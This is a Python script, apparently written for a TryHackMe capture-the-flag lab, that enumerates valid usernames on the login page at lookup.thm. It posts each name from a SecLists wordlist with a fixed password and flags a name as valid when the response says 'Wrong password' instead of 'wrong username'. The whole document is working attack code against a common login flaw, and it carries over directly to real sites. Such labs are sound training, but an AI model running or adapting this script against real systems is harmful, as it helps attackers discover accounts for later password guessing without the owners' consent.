import requests

# Target URL
url = "http://lookup.thm/login.php"

# Define path to usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines

            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing (note the correction here)
            }

            # Send the POST request
            response = requests.post(url, data=data)

            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong username

except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
